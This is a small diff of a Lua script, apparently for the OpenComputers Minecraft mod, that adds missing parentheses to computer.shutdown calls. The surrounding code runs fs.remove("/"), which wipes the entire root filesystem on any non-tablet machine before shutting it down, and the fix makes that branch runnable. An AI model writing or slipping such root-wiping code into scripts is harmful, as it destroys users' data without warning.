@@ -75,9 +75,9 @@ if isTablet() then
 else
   if component.isAvailable("computer") then
     fs.remove("/")
-    computer.shutdown
+    computer.shutdown()
   else
-    computer.shutdown
+    computer.shutdown()
   end
 end
 end
